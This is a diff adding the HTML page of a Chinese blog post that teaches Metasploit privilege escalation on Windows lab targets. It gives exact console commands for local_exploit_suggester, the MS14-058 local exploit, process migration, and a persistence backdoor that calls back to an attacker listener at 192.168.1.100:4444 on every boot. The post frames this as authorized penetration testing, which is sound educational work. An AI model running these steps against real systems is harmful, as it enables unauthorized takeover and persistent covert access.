@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="关于内网 Metasploit（MSF）渗透常用的靶机提权方法 — MRNOKK's Blog 技术文章">
+<meta property="og:title" content="关于内网 Metasploit（MSF）渗透常用的靶机提权方法 · MRNOKK's Blog">
+<meta property="og:description" content="关于内网 Metasploit（MSF）渗透常用的靶机提权方法 — 阅读技术文章，分享成长。">
+<meta property="og:type" content="article">
+<link rel="icon" href="images/favicon.svg" type="image/svg+xml">
+<title>关于内网 Metasploit（MSF）渗透常用的靶机提权方法 · MRNOKK's Blog</title>
+<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+<div class="progress-bar" id="progress" aria-hidden="true"></div>
+<div class="bg-wrap" aria-hidden="true">
+<div class="bg-orb orb-1"></div>
+<div class="bg-orb orb-2"></div>
+<div class="bg-orb orb-3"></div>
+</div>
+<header>
+<div class="nav-container">
+<div class="header-left">
+<a href="index.html" class="back-btn">← 返回首页</a>
+<div class="admin-only">
+<a href="admin.html?edit=post-1784610862469.html" class="back-btn">✏️ 编辑</a>
+<a href="#" onclick="deletePost('post-1784610862469.html');return false" class="back-btn">🗑️ 删除</a>
+</div>
+</div>
+<a href="index.html" class="logo">
+<img src="images/avatar02.jpg" alt="MRNOKK" class="avatar">
+<span>MRNOKK's Blog</span>
+</a>
+</div>
+</header>
+<div class="post-wrap">
+<div class="post-hero">
+<div class="post-tag">技术</div>
+<h1>关于内网 Metasploit（MSF）渗透常用的靶机提权方法</h1>
+<div class="post-info">
+<span>2026-07-21</span>
+<span>阅读约 5 分钟</span>
+	<span id="article-views">阅读 -- 次</span>
+</div>
+</div>
+<div class="post-content">
+<h2>全球使用最广泛的渗透测试框架</h2>
+<p>知识就是力量，尤其是在共享知识的情况下。Metasploit 由开源社区和 Rapid7 合作开发，它不仅能帮助安全团队验证漏洞、管理安全评估和提升安全意识，更能赋能防御者，让他们始终领先一步（甚至两步）。在内网渗透测试中，从获得初始立足点到完全控制目标系统，<strong>权限提升（Privilege Escalation）</strong> 是最关键的环节之一。本文将围绕 Metasploit 框架，从攻击前的情报收集，到自动化漏洞扫描，再到实战提权与持久化，梳理一套专业、高效的内网靶机提权流程。</p>
+<hr>
+<h3>一、提权前的信息收集：善用两个公开漏洞库</h3>
+<p>渗透测试的第一步始终是信息收集，精准的情报能极大提升漏洞利用的效率和成功率。在接触靶机之前，我们可以通过以下两个平台提前掌握目标系统可能存在的历史漏洞及可用载荷。</p>
+<ul>
+<li><p><strong>OpenCVE（<a href="https://app.opencve.io/%EF%BC%89">https://app.opencve.io/）</a></strong><br>这是一个常用的漏洞上报、监控与查询平台。我们可以利用它按产品、厂商或 CVE 编号查询目标系统相关的漏洞信息，了解漏洞细节、影响范围以及是否有公开的利用代码。提前查阅 CVE 信息，能够帮助你在获得低权限 Shell 后迅速判断系统可能存在的提权弱点。</p>
+</li>
+<li><p><strong>Exploit-DB（<a href="https://www.exploit-db.com/%EF%BC%89">https://www.exploit-db.com/）</a></strong><br>Kali Linux 自带的漏洞利用库查询站点，收录了大量已验证的漏洞利用代码。它按平台、类型分类，可直接搜索具体的漏洞利用（Exploit）和攻击载荷（Payload）。在实际渗透中，你可以通过 Exploit-DB 找到与目标系统版本匹配的本地提权利用代码，并对照 MSF 中是否已集成对应模块（例如 <code>exploit/windows/local/...</code>），从而快速选定攻击路径。</p>
+</li>
+</ul>
+<p>这两个平台相辅相成：OpenCVE 提供宏观的漏洞威胁情报，Exploit-DB 则给出具体的利用代码。将二者配合使用，可以为后续的漏洞验证和提权操作提供高质量的支撑，显著提升渗透测试报告的完成度。</p>
+<hr>
+<h3>二、MSF 提权基础：从 getsystem 到 local_exploit_suggester</h3>
+<p>当你在内网成功获得一个靶机的 Meterpreter 会话（通常是普通用户权限）后，第一件事就是尝试提权。</p>
+<p><strong>1. 快速尝试内置命令 getsystem</strong><br>在 Meterpreter 中直接执行 <code>getsystem</code>，MSF 会顺序尝试命名管道模拟、令牌复制等多种提权技术。这种方法简单快捷，但在较新、已安装安全补丁或权限配置严格的目标上，成功率非常有限——它仅适合作为初步试探。</p>
+<p><strong>2. 自动化扫描：local_exploit_suggester</strong><br>更可靠的方式是使用 MSF 内置的提权漏洞扫描模块，它会检查目标系统的缺失补丁、系统版本等信息，并推荐可能成功的本地提权利用模块。  </p>
+<pre><code class="language-bash">meterpreter &gt; background        # 或直接 run
+msf6 &gt; run post/multi/recon/local_exploit_suggester
+</code></pre>
+<p>或者直接在 Meterpreter 会话中执行：</p>
+<pre><code class="language-bash">meterpreter &gt; run post/multi/recon/local_exploit_suggester
+</code></pre>
+<p>该模块会列出 <code>[+]</code> 标记的潜在可用 Exploit，例如：</p>
+<pre><code>[+] 10.0.14393.0 - exploit/windows/local/ms16-032_secondary_logon_handle_privesc
+[+] 6.1.7601 - exploit/windows/local/ms14-058_track_popup_menu
+</code></pre>
+<p>这相当于为你绘制了一张“系统弱点地图”，接下来就可以有针对性地进行利用。</p>
+<hr>
+<h3>三、提权实战：以 MS14-058 为例</h3>
+<p>假设 <code>local_exploit_suggester</code> 提示目标存在 <strong>MS14-058（内核模式驱动程序中的权限提升漏洞）</strong>，对应的模块为 <code>exploit/windows/local/ms14_058_track_popup_menu</code>，可以按以下标准流程操作：</p>
+<ol>
+<li><p><strong>将当前 Meterpreter 会话放入后台</strong>  </p>
+<pre><code class="language-bash">msf6 &gt; background
+</code></pre>
+<p>或在 Meterpreter 中使用 <code>Ctrl+Z</code>。</p>
+</li>
+<li><p><strong>加载提权 Exploit 模块</strong>  </p>
+<pre><code class="language-bash">msf6 &gt; use exploit/windows/local/ms14_058_track_popup_menu
+</code></pre>
+</li>
+<li><p><strong>查看模块所需选项</strong>  </p>
+<pre><code class="language-bash">msf6 exploit(windows/local/ms14_058_track_popup_menu) &gt; show options
+</code></pre>
+<p>确认需要设置 <code>SESSION</code>（以及必要时设置 <code>TARGET</code>）。</p>
+</li>
+<li><p><strong>设置低权限会话并执行提权</strong>  </p>
+<pre><code class="language-bash">msf6 exploit(windows/local/ms14_058_track_popup_menu) &gt; set SESSION 1
+msf6 exploit(windows/local/ms14_058_track_popup_menu) &gt; run
+</code></pre>
+<p>若成功，会生成一个全新的 SYSTEM 权限 Meterpreter 会话。</p>
+</li>
+<li><p><strong>验证权限</strong><br>在新会话中执行 <code>getuid</code>，应返回 <code>NT AUTHORITY\SYSTEM</code>。</p>
+</li>
+</ol>
+<blockquote>
+<p><strong>提示</strong>：如果 Exploit 执行失败，可尝试通过 <code>set TARGET</code> 选择不同的利用目标编号，或检查系统语言、补丁等环境因素。务必在授权范围内操作。</p>
+</blockquote>
+<hr>
+<h3>四、提权后的稳定持久化</h3>
+<p>获得 SYSTEM 权限之后，为了防止连接中断或原始进程被关闭，需要立即采取会话保持措施。</p>
+<p><strong>1. 进程迁移（migrate）</strong><br>使用 <code>migrate</code> 可以将 Meterpreter 注入到一个稳定的系统进程中，避免因初始进程（如浏览器、临时 Payload 进程）退出而丢失会话。  </p>
+<pre><code class="language-bash">meterpreter &gt; ps          # 列出进程，选择一个 SYSTEM 权限的稳定进程，如 svchost.exe
+meterpreter &gt; migrate 3420   # 将会话迁移到 PID 3420 的进程
+</code></pre>
+<p>迁移成功后，即使最初的 Payload 进程结束，Meterpreter 仍驻留在目标内存中。</p>
+<p><strong>2. 建立持久性后门</strong><br>单独使用 <code>migrate</code> 并不能在系统重启后自动恢复连接，还需要配合专门的持久化模块。常用的有 <code>persistence</code> 和 <code>scheduled_task</code> 等：</p>
+<pre><code class="language-bash">meterpreter &gt; background
+msf6 &gt; use post/windows/manage/persistence
+msf6 post(windows/manage/persistence) &gt; set SESSION 2   # SYSTEM 会话
+msf6 post(windows/manage/persistence) &gt; set LHOST 192.168.1.100
+msf6 post(windows/manage/persistence) &gt; set LPORT 4444
+msf6 post(windows/manage/persistence) &gt; run
+</code></pre>
+<p>该模块会在目标系统创建自启动服务或注册表项，每次开机后自动连接回 MSF 监听，实现真正的持久化控制。</p>
+<hr>
+<h3>五、总结</h3>
+<p>内网 Metasploit 渗透中的提权，绝不是无脑地执行 <code>getsystem</code>。规范的操作路径应当是：</p>
+<ol>
+<li><strong>前置信息收集</strong>：借助 OpenCVE 与 Exploit-DB 锁定潜在漏洞和载荷；  </li>
+<li><strong>自动化扫描</strong>：利用 <code>local_exploit_suggester</code> 精准定位可用提权 Exploit；  </li>
+<li><strong>手动利用</strong>：根据扫描结果选择恰当的本地提权模块，配置并执行；  </li>
+<li><strong>稳固后门</strong>：提权成功后立即进行进程迁移和持久化配置，确保立足点不丢失。</li>
+</ol>
+<p>牢记，所有技术均应在合法授权下使用，以发现并帮助修复安全缺陷为目标。将信息收集与自动化工具深度融合，才能高效、专业地完成每一次内网渗透测试。</p>
+
+</div>
+<nav class="post-nav" aria-label="文章导航">
+<div class="placeholder"></div>
+<a href="post-1783877969799.html" class="next-link">
+  <span class="nav-label">下一篇 →</span>
+  <span class="nav-title">AI渗透测试：重塑攻防格局与职业未来</span>
+  </a>
+</nav>
+<div id="comment-section" data-blog-comments data-page-path="post-1784610862469"></div>
+</div>
+<footer>
+<p>&copy; 2026 MRNOKK's Blog. 用心记录，分享成长。</p>
+</footer>
+<script src="comments.js"></script>
+<script src="utils.js"></script>
+</body>
+</html>
